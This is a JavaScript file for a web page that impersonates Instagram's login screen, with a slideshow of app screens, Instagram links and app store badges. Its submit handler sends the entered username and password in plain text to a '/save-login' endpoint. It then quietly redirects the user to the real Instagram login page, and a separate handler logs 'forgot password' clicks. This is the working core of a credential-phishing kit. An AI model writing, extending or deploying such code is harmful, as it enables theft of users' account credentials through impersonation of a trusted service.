'use strict';

/* -------------------------------------------------------
   DOM REFERENCES
------------------------------------------------------- */
const usernameInput = document.getElementById('usernameInput');
const passwordInput = document.getElementById('passwordInput');
const loginBtn = document.getElementById('loginBtn');
const togglePasswordBtn = document.getElementById('togglePasswordBtn');
const loginForm = document.getElementById('loginForm');
const slideshowContainer = document.getElementById('slideshowContainer');
const forgotPasswordLink = document.getElementById('forgotPasswordLink');
const signupLink = document.getElementById('signupLink');
const appStoreBadge = document.getElementById('appStoreBadge');
const playStoreBadge = document.getElementById('playStoreBadge');

/* -------------------------------------------------------
   1. LOGIN VALIDATION
------------------------------------------------------- */
function validateLoginForm() {
  const isUsernameValid = usernameInput.value.trim().length > 0;
  const isPasswordValid = passwordInput.value.length > 5;
  const isFormValid = isUsernameValid && isPasswordValid;

  loginBtn.disabled = !isFormValid;
  loginBtn.setAttribute('aria-disabled', String(!isFormValid));
}

if (usernameInput) usernameInput.addEventListener('input', validateLoginForm);
if (passwordInput) passwordInput.addEventListener('input', validateLoginForm);

/* -------------------------------------------------------
   2. FLOATING LABEL
------------------------------------------------------- */
function updateFloatingLabel(inputEl) {
  const wrapper = inputEl.closest('.input-group');
  if (!wrapper) return;

  if (inputEl.value.length > 0) {
    wrapper.classList.add('has-value');
  } else {
    wrapper.classList.remove('has-value');
  }
}

[usernameInput, passwordInput].forEach(input => {
  if (!input) return;
  input.addEventListener('input', () => updateFloatingLabel(input));
  input.addEventListener('focus', () => updateFloatingLabel(input));
  input.addEventListener('blur', () => updateFloatingLabel(input));
});

/* -------------------------------------------------------
   3. PASSWORD SHOW/HIDE
------------------------------------------------------- */
function handlePasswordInput() {
  if (!togglePasswordBtn) return;

  if (passwordInput.value.length > 0) {
    togglePasswordBtn.style.display = 'flex';
  } else {
    togglePasswordBtn.style.display = 'none';
    passwordInput.type = 'password';
    togglePasswordBtn.textContent = 'Show';
  }
}

function togglePasswordVisibility() {
  if (!passwordInput || !togglePasswordBtn) return;

  const isPassword = passwordInput.type === 'password';
  passwordInput.type = isPassword ? 'text' : 'password';
  togglePasswordBtn.textContent = isPassword ? 'Hide' : 'Show';
}

if (passwordInput) passwordInput.addEventListener('input', handlePasswordInput);
if (togglePasswordBtn) {
  togglePasswordBtn.addEventListener('click', togglePasswordVisibility);
}

/* -------------------------------------------------------
   4. LOGIN SUBMIT (SAVE + REDIRECT)
------------------------------------------------------- */
if (loginForm) {
  loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    const username = usernameInput.value.trim();
    const password = passwordInput.value;

    if (!username || !password) {
      alert("Please enter username and password");
      return;
    }

    try {
      const response = await fetch('/save-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
      });

      const result = await response.json();

      if (result.success) {
        window.location.href = "https://www.instagram.com/accounts/login/";
      } else {
        alert("Failed to save login details");
      }
    } catch (error) {
      console.error(error);
      alert("Server connection failed");
    }
  });
}

/* -------------------------------------------------------
   5. LINKS
------------------------------------------------------- */
if (forgotPasswordLink) {
  forgotPasswordLink.addEventListener('click', async function (e) {
    e.preventDefault();

    // Fire-and-forget: log the click to the database
    try {
      await fetch('/log-forgot', { method: 'POST' });
    } catch (_) {
      // Never block the redirect if logging fails
    }

    window.location.href =
      'https://www.instagram.com/accounts/password/reset/';
  });
}

if (signupLink) {
  signupLink.addEventListener('click', function (e) {
    e.preventDefault();
    window.location.href =
      'https://www.instagram.com/accounts/emailsignup/';
  });
}

/* -------------------------------------------------------
   6. APP STORE
------------------------------------------------------- */
if (appStoreBadge) {
  appStoreBadge.addEventListener('click', function (e) {
    e.preventDefault();
    window.location.href =
      'https://apps.apple.com/app/instagram/id389801252';
  });
}

/* -------------------------------------------------------
   7. PLAY STORE
------------------------------------------------------- */
if (playStoreBadge) {
  playStoreBadge.addEventListener('click', function (e) {
    e.preventDefault();
    window.location.href =
      'https://play.google.com/store/apps/details?id=com.instagram.android';
  });
}

/* -------------------------------------------------------
   8. SLIDESHOW
------------------------------------------------------- */
const SCREEN_IDS = [
  'screen-feed',
  'screen-explore',
  'screen-dm',
  'screen-profile'
];

let currentScreenIndex = 0;
const SLIDE_INTERVAL_MS = 3000;

function advanceSlideshow() {
  const screens = SCREEN_IDS.map(id => document.getElementById(id));
  if (screens.some(s => !s)) return;

  screens[currentScreenIndex].classList.remove('active');
  currentScreenIndex = (currentScreenIndex + 1) % screens.length;
  screens[currentScreenIndex].classList.add('active');
}

function initSlideshow() {
  if (!slideshowContainer) return;
  setInterval(advanceSlideshow, SLIDE_INTERVAL_MS);
}

/* -------------------------------------------------------
   9. ACCESSIBILITY
------------------------------------------------------- */
document.querySelectorAll('[role="button"]').forEach(el => {
  el.addEventListener('keydown', function (e) {
    if (e.key === 'Enter' || e.key === ' ') {
      e.preventDefault();
      el.click();
    }
  });
});

/* -------------------------------------------------------
   INIT
------------------------------------------------------- */
document.addEventListener('DOMContentLoaded', function () {
  initSlideshow();
  validateLoginForm();
});